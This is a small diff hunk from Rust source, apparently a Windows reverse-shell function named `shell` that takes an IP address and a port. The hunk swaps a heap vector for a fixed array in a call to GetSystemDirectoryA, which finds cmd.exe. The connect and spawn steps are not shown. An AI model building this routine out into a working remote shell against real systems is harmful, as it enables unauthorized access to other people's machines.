@@ -59,7 +59,7 @@ pub fn shell(ip: &str, port: u16) {
     // Call GetSystemDirectoryA to figure out where cmd.exe will be
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/SystemInformation/fn.GetSystemDirectoryA.html
-    let lp_buffer: &mut [u8] = &mut vec![0; 50];
+    let lp_buffer: &mut [u8] = &mut [0; 50];
     unsafe { GetSystemDirectoryA(lp_buffer) };
     let system_dir = unsafe { CStr::from_ptr(lp_buffer.as_ptr() as *const i8) };
     let system_dir = system_dir.to_str().unwrap();
